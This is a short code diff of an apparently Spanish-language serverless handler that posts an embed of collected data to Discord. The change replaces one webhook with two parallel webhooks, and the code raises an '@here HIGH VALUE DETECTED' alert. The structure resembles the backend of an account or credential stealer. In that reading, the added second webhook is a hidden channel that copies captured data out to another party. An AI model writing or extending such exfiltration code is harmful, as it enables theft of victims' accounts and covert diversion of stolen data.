@@ -225,40 +225,45 @@ export default async function handler(req, res) {
         // ================ FIN DE LA SECCIÓN DE ENLACES ================
         
         // Enviar a Discord
-        const discordWebhook = process.env.DISCORD_WEBHOOK_URL;
-        if (discordWebhook) {
-            try {
-                const discordPayload = {
-                    embeds: [discordEmbed],
-                    username: "Z L |  Finter",
-                    avatar_url: "https://i.imgur.com/4M34hi2.png"
-                };
-                
-                // Mención para valores altos
-                if (isHighValue) {
-                    discordPayload.content = "@here 🚨 **HIGH VALUE DETECTED!** 🚨";
-                }
-                
-                console.log("📤 Enviando a Discord...");
-                const discordResponse = await fetch(discordWebhook, {
+        // Enviar a Discord (DOS WEBHOOKS)
+const discordWebhooks = [
+    process.env.DISCORD_WEBHOOK_URL,
+    process.env.DISCORD_WEBHOOK_URL_2
+].filter(Boolean);
+
+if (discordWebhooks.length > 0) {
+    try {
+        const discordPayload = {
+            embeds: [discordEmbed],
+            username: "Z L | Finter",
+            avatar_url: "https://i.imgur.com/4M34hi2.png"
+        };
+
+        // Mención para valores altos
+        if (isHighValue) {
+            discordPayload.content = "@here 🚨 **HIGH VALUE DETECTED!** 🚨";
+        }
+
+        console.log("📤 Enviando a Discord (2 webhooks)...");
+
+        await Promise.all(
+            discordWebhooks.map(webhook =>
+                fetch(webhook, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(discordPayload)
-                });
-                
-                console.log("✅ Discord status:", discordResponse.status);
-                
-                if (!discordResponse.ok) {
-                    const errorText = await discordResponse.text();
-                    console.log("⚠️ Discord error:", errorText);
-                }
-                
-            } catch (discordError) {
-                console.log("⚠️ Error enviando a Discord:", discordError.message);
-            }
-        } else {
-            console.log("⚠️ DISCORD_WEBHOOK_URL no configurada");
-        }
+                })
+            )
+        );
+
+        console.log("✅ Enviado a todos los webhooks");
+
+    } catch (discordError) {
+        console.log("⚠️ Error enviando a Discord:", discordError.message);
+    }
+} else {
+    console.log("⚠️ No hay webhooks configurados");
+}
         
         // Responder éxito
         const responseData = { 
